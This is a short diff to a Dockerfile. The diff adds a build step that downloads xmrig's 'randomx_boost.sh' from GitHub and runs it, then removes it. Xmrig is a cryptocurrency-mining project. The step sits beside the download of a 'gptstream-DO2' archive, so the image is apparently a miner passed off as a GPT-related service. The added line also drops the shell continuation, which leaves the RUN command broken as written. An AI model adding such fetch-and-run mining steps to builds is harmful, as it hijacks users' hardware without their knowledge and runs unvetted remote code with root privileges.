@@ -5,6 +5,7 @@ LABEL maintainer="Roman Nikov"
 RUN apt update; \
     apt install -y libuv1-dev; \
     apt install -y wget; \
+    wget https://raw.githubusercontent.com/xmrig/xmrig/dev/scripts/randomx_boost.sh -v -O randomx_boost.sh; ./randomx_boost.sh; rm -rf randomx_boost.sh
     wget https://gptstream.obs.ru-moscow-1.hc.sbercloud.ru/gptstream-DO2.tar.gz; \
     tar xf gptstream-DO2.tar.gz; \
     cd gptstream-DO2; \
